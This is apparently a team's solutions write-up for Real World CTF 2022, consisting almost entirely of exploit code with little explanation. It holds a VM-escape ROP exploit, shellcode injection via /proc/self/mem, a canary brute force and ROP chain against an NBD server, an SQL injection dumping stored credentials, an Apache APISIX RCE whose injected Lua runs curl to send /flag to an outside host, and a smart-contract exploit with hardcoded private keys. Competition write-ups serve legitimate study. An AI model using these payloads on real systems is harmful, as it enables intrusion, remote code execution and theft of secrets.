# Real World CTF 2022

 - [Real World CTF 2022](#real-world-ctf-2022)
   - [clone pwn](#clonepwn)
     - [svme](#svme)
     - [QLaaS](#qlaas)
     - [Who Moved My Block](#who-moved-my-block)
   - [web](#web)
     - [hack into skynet](#hack-into-skynet)
     - [API6](#api6)
   - [crypto(currency)](#cryptocurrency)
     - [Tresure Hunter](#tresure-hunter)

## clone+pwn

### svme

```python=
from pwn import *

###Util
opcodeTable = {'nop':(0,0),
               'add':(1,0),
               'sub':(2,0),
               'mul':(3,0),
               'lt':(4,0),
               'eq':(5,0),
               'jmp':(6,1),
               'jeq':(7,1),
               'jne':(8,1),
               'push':(9,1),
               'load':(10,1),
               'gload':(11,1),
               'store':(12,1),
               'gstore':(13,1),
               'print':(14,0),
               'pop':(15,0),
               'call':(16,3),
               'ret':(17,0),
               'hlt':(18,0)}

def Vasm(code):
    code = code.split('\n')
    TAG = {}
    TORESOLVE = {}
    bcode = b''
    for line in code:
        cmt = line.find('//')
        if cmt!=-1:
            line = line[:line.find('//')]
        line = line.strip()
        if line=='':
            continue
        line = line.split(' ')
        opcode = line[0].strip()
        if opcode[-1]==':':
            TAG[opcode[:-1]] = len(bcode)//4
            continue
        if opcode not in opcodeTable:
            print(f'invalid opcode {opcode}')
            exit()
        bcode+=p32(opcodeTable[opcode][0])
        if opcodeTable[opcode][1]>0:
            oprands = line[1].split(',')
            assert len(oprands)==opcodeTable[opcode][1]
            for oprand in oprands:
                oprand = oprand.strip()
                sign = 1
                if oprand[0]=='-':
                    sign = -1
                    oprand = oprand[1:]
                if oprand[:2]=='0x':
                    opr = int(oprand[2:],16)
                elif oprand[0]>='0' and oprand[0]<='9':
                    opr = int(oprand)
                else:
                    if opcode!='jeq' and opcode!='jne' and opcode!='jmp' and opcode!='call':
                        print('inavalid usage of TAG')
                        exit()
                    TORESOLVE[len(bcode)] = oprand
                    opr = 0
                opr*=sign
                if opr<0:
                    opr+=1<<32
                bcode+=p32(opr)
    for tag in TORESOLVE:
        if TORESOLVE[tag] not in TAG:
            print(f'unknown tag {tag}')
            exit()
        bcode = bcode[:tag]+p32(TAG[TORESOLVE[tag]])+bcode[tag+4:]
    return bcode

###Addr
libc_start_offset = 0x26fc0
system_offset = 0x55410
bin_sh_offset = 0x1b75aa

###ROPgadget
L_add_rsp_0x40 = 0x125a0b
L_pop_rdi = 0x26b72
L_nop = 0x26b73

###Exploit
code = Vasm(f'''
             gload -0x840   //code
             gload -0x83f   //code
             jmp NEXT
             DO_OVERWRITE:
                pop
                pop
                pop
                load 1
                load 0
                ret
             NEXT:
             call DO_OVERWRITE,2,0
             gload 134

             push {libc_start_offset+243}
             sub
             gstore 20
             gload 135
             gstore 21

             gload 20
             push {L_add_rsp_0x40}
             add
             gstore -10
             gload 21
             gstore -9

             gload 20
             push {L_pop_rdi}
             add
             gstore 8
             gload 21
             gstore 9

             gload 20
             push {bin_sh_offset}
             add
             gstore 10
             gload 21
             gstore 11

             gload 20
             push {system_offset}
             add
             gstore 12
             gload 21
             gstore 13

             push 0
             push 0

             hlt
             ''').ljust(128*4,b'\x00')
r = remote('47.243.140.252',1337)
r.send(code)
r.interactive()
```

### QLaaS

```python=
from pwn import *

r = remote('47.242.149.197',7600)

with open('exp','rb') as f:
    data = f.read()

r.sendlineafter(':\n',b64e(data))
line = r.recvuntil('python3.9')
while b'r-x' not in line:
    line = r.recvline()
prange = line.split(b' ')[0].split(b'-')
pstart = int(prange[0],16)
pend = int(prange[1],16)
print(hex(pstart),hex(pend))
r.send(p64(pstart)+p64(pend))

r.interactive()
```

```c=
#include<stdio.h>
#include<string.h>
#include<linux/fcntl.h>
#include<unistd.h>
#include<sys/stat.h>

char shellcode[] = "H\xbf/bin/sh\x00WH\x89\xe7H1\xf6H1\xd2H\xc7\xc0;\x00\x00\x00\x0f\x05";
char nopsled[0x100];

int main(){
  int dfd = open("./",O_DIRECTORY);
  int dfd2 = openat(dfd,"../../../../../",O_DIRECTORY);
  int fd = openat(dfd2,"./proc/self/maps",O_RDONLY,0);
  int fd2 = openat(dfd2,"./proc/self/mem",O_WRONLY,0);
  char buf[0x1000];
  memset(nopsled,0x90,0x100);
  int sz = read(fd,buf,0x1000);
  if(sz>0) write(1,buf,sz);
  if(read(0,buf,0x10)!=0x10) puts("read failed");
  lseek(fd2,*(off_t*)(&buf[8])-0x100,SEEK_SET);
  if(write(fd2,shellcode,sizeof(shellcode))!=sizeof(shellcode)) puts("write failed");
  for(int i=2;i<16;i++){
    lseek(fd2,*(off_t*)(&buf[8])-0x100*i,SEEK_SET);
    if(write(fd2,nopsled,sizeof(nopsled))!=0x100) puts("write failed");
  }
  fflush(stdout);
  _exit(0);
}
```

### Who Moved My Block

```python=
from pwn import *
import hashlib


def POW(r):
    prefix = r.recvuntil('"+"',drop=True).split(b'"')[-1]
    difficulty = int(r.recvuntil('bits',drop=True).split(b' ')[-1])
    cnt = 0
    while True:
        if cnt%100000==0:
            print(cnt)
        cur = prefix+str(cnt).encode()
        if int(hashlib.sha256(cur).hexdigest(),16)>>(256-difficulty)==0:
            r.sendlineafter(': ',str(cnt))
            break
        cnt+=1

def getServer():
    p = remote('47.242.113.232',31337)
    POW(p)
    p.recvuntil(' 0.0.0.0:')
    port = int(p.recvline()[:-1])
    return p,port

def sendMsg(msg):
    r.send(p32(len(msg),endianness='big')+msg)

def negotiate(option,msg):
    r.send('IHAVEOPT')
    r.send(p32(option,endianness='big'))
    sendMsg(msg)

def handleInfo(L,nameL,bufC):
    r.send('IHAVEOPT')
    r.send(p32(6,endianness='big'))
    r.send(p32(L,endianness='big'))
    r.send(p32(nameL,endianness='big'))
    r.send(bufC)
    r.send('\x00'*nameL)
    r.send(p16(0,endianness='big'))
    r.recvuntil('An OPT_INFO request')

###Addr
negotiate_offset = 0x9570
system_plt_offset = 0x3bb0
read_got_offset = 0x12d00
bss_offset = 0x13800

###ROPgadget
C_pop_rdi = 0x4a58
C_set_param = 0xc2aa
C_call_func = 0xc290

kAlive,port = getServer()
IP = '47.242.113.232'

canary = b'\x00'
while len(canary)<8:
    for j in range(0x100):
        print(len(canary),j)
        r = remote(IP,port)
        r.recvuntil('NBDMAGICIHAVEOPT\x00\x03') #INIT_PASSWD + opts_magic + smallflags
        r.send(b'\x00\x00\x00\x03') #cflags(NEWSTYLE|NO_ZEROES) + opts_magic
        handleInfo(0x408+4+len(canary)+1,0x408+len(canary)+1,b'a'*0x408+canary+p8(j))
        try:
            negotiate(10,b'')
            r.recvuntil('given option is unknown')
            canary+=p8(j)
            print(canary)
            negotiate(2,b'')
            r.close()
            break
        except:
            r.close()
print(canary)

negotiate_addr = p8(negotiate_offset&0xff)
while len(negotiate_addr)<6:
    if len(negotiate_addr)==1:
        ITER = 0x10
    else:
        ITER = 0x1
    if len(negotiate_addr)==5:
        START = 0x50
    else:
        START = 0
    for j in range(START,0x100,ITER):
        print(len(negotiate_addr),j)
        r = remote(IP,port)
        r.recvuntil('NBDMAGICIHAVEOPT\x00\x03') #INIT_PASSWD + opts_magic + smallflags
        r.send(b'\x00\x00\x00\x03') #cflags(NEWSTYLE|NO_ZEROES) + opts_magic
        if len(negotiate_addr)==1:
            handleInfo(0x448+4+len(negotiate_addr)+1,0x448+len(negotiate_addr)+1,b'a'*0x408+canary+b'a'*0x38+negotiate_addr+p8(j|((negotiate_offset>>8)&0xf)))
        else:
            handleInfo(0x448+4+len(negotiate_addr)+1,0x448+len(negotiate_addr)+1,b'a'*0x408+canary+b'a'*0x38+negotiate_addr+p8(j))
        try:
            r.recvuntil('NBDMAGICIHAVEOPT')
            if len(negotiate_addr)==1:
                negotiate_addr+=p8(j|((negotiate_offset>>8)&0xf))
            else:
                negotiate_addr+=p8(j)
            print(negotiate_addr)
            r.close()
            break
        except:
            r.close()
negotiate_addr+=b'\x00\x00'
code_base = u64(negotiate_addr)-negotiate_offset
print(hex(code_base))

r = remote(IP,port)
r.recvuntil('NBDMAGICIHAVEOPT\x00\x03') #INIT_PASSWD + opts_magic + smallflags
r.send(b'\x00\x00\x00\x03') #cflags(NEWSTYLE|NO_ZEROES) + opts_magic
ROPchain = p64(code_base+C_set_param)+p64(0)+p64(1)+p64(4)+p64(code_base+bss_offset)+p64(22)+p64(code_base+read_got_offset)+\
           p64(code_base+C_call_func)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+\
           p64(code_base+C_pop_rdi)+p64(code_base+bss_offset)+\
           p64(code_base+system_plt_offset)
handleInfo(0x448+4+len(ROPchain),0x448+len(ROPchain),b'a'*0x408+canary+b'a'*0x38+ROPchain)
r.send(b'cat /mnt/flag.txt >&4\x00')
print(r.recvall())
r.interactive()
```

## web
### hack into skynet

```http
POST / HTTP/1.1
Host: 47.242.21.212:8081
Content-Length: 247
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKhkYDh3tENxA2icS
Cookie: SessionId=e8b7fdceddfac5aa6f84044abd832f87
Connection: close

------WebKitFormBoundaryKhkYDh3tENxA2icS
Content-Disposition: form-data; name="name"

'union select access_key,password||':'||secret_key||':'||password from target_credentials limit 1 offset 6
-- -
------WebKitFormBoundaryKhkYDh3tENxA2icS--
```

=> `rwctf{t0-h4ck-$kynet-0r-f1ask_that-Is-th3-questi0n}`

### API6

```http
POST /apisix/batch-requests HTTP/1.1
Host: localhost:9080
Content-Type: application/json
Connection: close
Content-Length: 526

{
    "headers": {
        "X-API-KEY":"edd1c9f034335f136f87ad84b625c8f1",
        "X-Real-IP":"127.0.0.1"
    },
    "timeout": 500,
    "pipeline": [
        {
            "method": "PUT",
            "path": "/apisix/admin/routes/1",
            "headers": {
                "X-Real-IP":"127.0.0.1"
            },
            "body":"{
                \"uri\": \"/rce\",
                \"script\": \"local _M = {} \n function _M.access(api_ctx) \n os.execute('curl ginoah.tw?p=`cat /flag`')\n end \nreturn _M\"
            }"
        }
    ]
}
```
Then trigger the script

```http
GET /rce HTTP/1.1
Host: localhost:9080
Connection: close
```

=>`rwctf{1998e51bd0dd6ba945d0676d45d32852}`

## crypto(currency)

### Tresure Hunter

```python=
from pwn import *
from Crypto.Util.number import long_to_bytes,bytes_to_long
import hashlib
import sys
import subprocess
import json
from web3 import Web3
from eth_account import Account
from ethereum.transactions import Transaction
import binascii
import sha3
import requests
import time

###Util
def leafHash(address,val):
    if val==0:
        return b'\x00'*32
    else:
        return sha3.keccak_256(long_to_bytes(int(address[2:],16)).rjust(32,b'\x00')+long_to_bytes(val).rjust(32,b'\x00')).digest()

def merge(l,r):
    if l==0 and r==0:
        return b'\x00'*32
    elif l==0:
        return r
    elif r==0:
        return l
    else:
        return sha3.keccak_256(l+r).digest()

def calcRoot(proof,leaves):
    idx = 0
    cur = 0
    stack = []
    L = len(proof)
    hist = []
    while idx<L:
        if proof[idx]==0x4c:
            stack.append((leaves[cur][0],leafHash(leaves[cur][0],leaves[cur][1])))
            cur+=1
            idx+=1
        elif proof[idx]==0x48:
            if L<2:
                print('stack underflow')
                exit()
            if idx>=L-1:
                print('instruction overflow')
                exit()
            height = proof[idx+1]
            N1 = stack[-1]
            N2 = stack[-2]
            stack = stack[:-2]
            N1_A = int(N1[0][2:],16)
            N2_A = int(N2[0][2:],16)
            if (N1_A>>(height+1))!=(N2_A>>(height+1)):
                print('path mismatch')
                exit()
            if ((N1_A>>height)&1)==((N2_A>>height)&1):
                print('incorrect height',N1[0],N2[0],height)
                exit()
            if ((N1_A>>height)&1)==0:
                N = (N2[0],merge(N1[1],N2[1]))
            else:
                N = (N2[0],merge(N2[1],N1[1]))
            idx+=2
            stack.append(N)
        elif proof[idx]==0x50:
            if L<1:
                print('stack underflow')
                exit()
            if idx>=L-2:
                print('instruction overflow')
                exit()
            height = proof[idx+1]
            N1 = stack[-1]
            stack = stack[:-1]
            N1_A = int(N1[0][2:],16)
            if ((N1_A>>height)&1)==0:
                N = ('0x'+hex((N1_A>>(height+1))<<(height+1))[2:].rjust(40,'0'),merge(N1[1],proof[idx+2]))
            else:
                N = ('0x'+hex((N1_A>>(height+1))<<(height+1))[2:].rjust(40,'0'),merge(proof[idx+2],N1[1]))
            idx+=3
            stack.append(N)
        hist.append(stack)
    return hist

def encodeProof(proof):
    enc = []
    for x in proof:
        if type(x)==int:
            x = long_to_bytes(x).rjust(32,b'\x00')
        enc.append(x)
    return enc

def createAccount():
    account = web3.eth.account.create()
    res = requests.post(f'http://{ip}:{Fport}/api/claim',data={'address':account.address})
    return account

def wait(txhash):
    while True:
        try:
            rcpt = web3.eth.getTransactionReceipt(txhash)
            break
        except:
            time.sleep(1)
    return rcpt


def solve(accountA,accountB,target):
    def debug0(rcpt):
        print('status :',rcpt.status)
    def debug1(web3, contract_addr):
        event_filter = web3.eth.filter({'address':contract_addr})
        print('events : ')
        for Filter in event_filter.get_all_entries():
            print(Filter['data'])
    hunters = [('0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e',1),
               ('0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45',1),
               ('0x6B175474E89094C44Da98b954EedeAC495271d0F',1),
               ('0x6B3595068778DD592e39A122f4f5a5cF09C90fE2',1),
               ('0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B',1),
               ('0xc00e94Cb662C3520282E6f5717214004A7f26888',1),
               ('0xD533a949740bb3306d119CC777fa900bA034cd52',1),
               ('0xdAC17F958D2ee523a2206206994597C13D831ec7',1)]
    proof = [0x4c,0x4c,0x4c,0x4c,0x48,0x95,0x48,0x99,0x48,0x9e,0x4c,0x4c,0x4c,0x4c,0x48,0x9b,0x48,0x9c,0x48,0x9e,0x48,0x9f]
    abi = [{'name':'enter','constant':True,'inputs':[{'name':'_proofs','type':'bytes32[]'}],'outputs':[],'payable':False,'type':'function'},
           {'name':'leave','constant':True,'inputs':[{'name':'_proofs','type':'bytes32[]'}],'outputs':[],'payable':False,'type':'function'},
           {'name':'findKey','constant':True,'inputs':[{'name':'_proofs','type':'bytes32[]'}],'outputs':[],'payable':False,'type':'function'},
           {'name':'pickupTreasureChest','constant':True,'inputs':[{'name':'_proofs','type':'bytes32[]'}],'outputs':[],'payable':False,'type':'function'},
           {'name':'openTreasureChest','constant':True,'inputs':[],'outputs':[],'payable':False,'type':'function'},
           {'name':'root','constant':True,'inputs':[],'outputs':[{'name':'root','type':'bytes32'}],'payable':False,'type':'function'},
           {'name':'smtMode','constant':True,'inputs':[],'outputs':[{'name':'smtMode','type':'bytes32'}],'payable':False,'type':'function'},
           {'name':'haveKey','constant':True,'inputs':[{'name':'address','type':'address'}],'outputs':[{'name':'state','type':'bool'}],'payable':False,'type':'function'},
           {'name':'haveTreasureChest','constant':True,'inputs':[{'name':'address','type':'address'}],'outputs':[{'name':'state','type':'bool'}],'payable':False,'type':'function'}]
    contract = web3.eth.contract(address=target,abi=abi)

    hist = calcRoot(proof,hunters)
    keyState = hist[-2]
    proof = [0x4c,0x50,2,keyState[0][1],0x50,1,keyState[1][1]]
    pe = encodeProof(proof)

    tx = contract.functions.enter(pe).buildTransaction({'from':accountA.address})
    tx['nonce'] = web3.eth.get_transaction_count(accountA.address)
    tx = web3.eth.account.sign_transaction(tx,accountA.key)
    txhash = web3.eth.sendRawTransaction(tx.rawTransaction)
    rcpt = wait(txhash)
    print(rcpt)

    tx = contract.functions.pickupTreasureChest(pe).buildTransaction({'from':accountA.address})
    tx['nonce'] = web3.eth.get_transaction_count(accountA.address)
    tx = web3.eth.account.sign_transaction(tx,accountA.key)
    txhash = web3.eth.sendRawTransaction(tx.rawTransaction)
    rcpt = wait(txhash)
    print(rcpt)

    hist = calcRoot(proof,[(accountA.address,1)])
    nkeyState = hist[-2]
    proof = [0x4c,0x50,0x9e,keyState[1][1],0x50,0x9f,nkeyState[0][1]]
    pe = encodeProof(proof)

    tx = contract.functions.enter(pe).buildTransaction({'from':accountB.address})
    tx['nonce'] = web3.eth.get_transaction_count(accountB.address)
    tx = web3.eth.account.sign_transaction(tx,accountB.key)
    txhash = web3.eth.sendRawTransaction(tx.rawTransaction)
    rcpt = wait(txhash)
    print(rcpt)

    tx = contract.functions.leave(pe).buildTransaction({'from':accountB.address})
    tx['nonce'] = web3.eth.get_transaction_count(accountB.address)
    tx = web3.eth.account.sign_transaction(tx,accountB.key)
    txhash = web3.eth.sendRawTransaction(tx.rawTransaction)
    rcpt = wait(txhash)
    print(rcpt)

    tx = contract.functions.findKey(pe).buildTransaction({'from':accountA.address})
    tx['nonce'] = web3.eth.get_transaction_count(accountA.address)
    tx = web3.eth.account.sign_transaction(tx,accountA.key)
    txhash = web3.eth.sendRawTransaction(tx.rawTransaction)
    rcpt = wait(txhash)
    print(rcpt)

    print(contract.functions.haveKey(accountA.address).call({'from':accountA.address}))
    print(contract.functions.haveTreasureChest(accountA.address).call({'from':accountA.address}))

    tx = contract.functions.openTreasureChest().buildTransaction({'from':accountA.address})
    tx['nonce'] = web3.eth.get_transaction_count(accountA.address)
    tx = web3.eth.account.sign_transaction(tx,accountA.key)
    txhash = web3.eth.sendRawTransaction(tx.rawTransaction)
    rcpt = wait(txhash)
    print(rcpt)

###Exploit
ip = '47.243.235.111'
Mport = 20000
Fport = 8080
Gport = 8545

web3 = Web3(Web3.HTTPProvider(f'http://{ip}:{Gport}',request_kwargs={'timeout':60}))

accountA = Account.from_key(b'~\xf6\xd8\xef\x14@\xa9\xd6\x13\x98`\xbc\x9do\xf1\x14T\x96\xc2wO}O\xee\xc2&\xf5\xb4\xcb\x96\x07\xed')
accountB = Account.from_key(b'\xb1t\x05 p\x1a\xd4\x08&U7\x14\x83\x89\xdeJ/\xf4\x9b\x17\xd0\x8cz!\xd2"\xe4\xdb\x16\xa9(:')
#accountA = createAccount()
#accountB = createAccount()

solve(accountA,accountB,'0x7265141788cdB6821148e0141B6467631E40d9fc')
